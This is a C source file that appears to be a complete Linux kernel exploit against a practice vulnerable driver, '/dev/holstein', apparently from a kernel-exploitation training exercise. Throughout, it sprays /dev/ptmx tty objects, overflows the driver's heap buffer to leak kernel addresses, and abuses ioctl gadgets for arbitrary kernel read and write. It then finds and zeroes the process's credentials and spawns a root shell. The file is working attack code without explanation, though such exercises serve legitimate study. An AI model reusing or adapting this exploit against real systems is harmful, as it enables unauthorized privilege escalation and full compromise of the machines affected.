#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>

#define store_rdx_ecx 0x4b27c2
#define mov_eax_prdx 0x440428
#define modprobe_path 0xe38180

unsigned long user_cs, user_ss, user_rflags, user_rsp;
unsigned long image_base = 0, heap_leak = 0;
int gfd = 0;
int spray[100];
char buf[0x500];

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void aaw(unsigned long addr, unsigned long val) {
    unsigned long *ptr = (unsigned long *)&buf;
    ptr[12] = image_base + store_rdx_ecx;
    *(unsigned long *)&buf[0x418] = heap_leak;
    write(gfd, buf, 0x500);

    // trigger mov [rdx], ecx
    for(int i = 0; i < 100; i++) {
        ioctl(spray[i], val, addr);
    }
}

int cache_fd = -1;
unsigned int aar(unsigned long addr) {
    if(cache_fd == -1) {
        unsigned long *ptr = (unsigned long *)&buf;
        ptr[12] = image_base + mov_eax_prdx;
        *(unsigned long *)&buf[0x418] = heap_leak;
        write(gfd, buf, 0x420);
    }

    // trigger mov ecx, [rdx]
    if(cache_fd != -1) {
        return ioctl(cache_fd, 0, addr);
    } else {
        for(int i = 0; i < 100; i++) {
            int tmp = ioctl(spray[i], 0, addr);
            if(tmp != -1) {
                cache_fd = spray[i];
                return tmp;
            }
        }
    }

    return 0;
}

static void exploit() {
    for(int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY  | O_NOCTTY);
    }

    gfd = open("/dev/holstein", O_RDWR);

    for(int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }
    
    read(gfd, buf, 0x500);

    for(int i = 0; i <= 0x500; i += 8) {
        printf("[0x%04x] 0x%016lx\n", i, *(unsigned long *)&buf[i]);
    }

    image_base = *(unsigned long *)&buf[0x418] - 0xc38880;
    heap_leak = *(unsigned long*)&buf[0x438] - 0x438;
    printf("[+] image_base: 0x%016lx\n", image_base);
    printf("[+] heap_leak: 0x%016lx\n", heap_leak);

    // Start spray
    prctl(PR_SET_NAME, "kurozaki");
    unsigned long addr = heap_leak - 0x1000000;
    while(1) {
        if((addr & 0xfffff) == 0) {
            printf("[+] searching... 0x%016lx\n", addr);
        }

        if(aar(addr) == 0x6f72756b && aar(addr + 0x4) == 0x696b617a) {
            printf("[+] found 'comm' at 0x%016lx\n", addr);
            break;
        }

        addr += 0x8;
    }

    unsigned long addr_cred = aar(addr - 8) | ((unsigned long)aar(addr - 4) << 32);
    printf("[+] current->cred = 0x%016lx\n", addr_cred);

    for(int i = 1; i < 9; i++) {
        aaw(addr_cred + i * 4, 0);
    }

    puts("[+] win!");
    system("/bin/sh");
    return;   
}

int main() {
    save_state();
    exploit();
    return 0;
}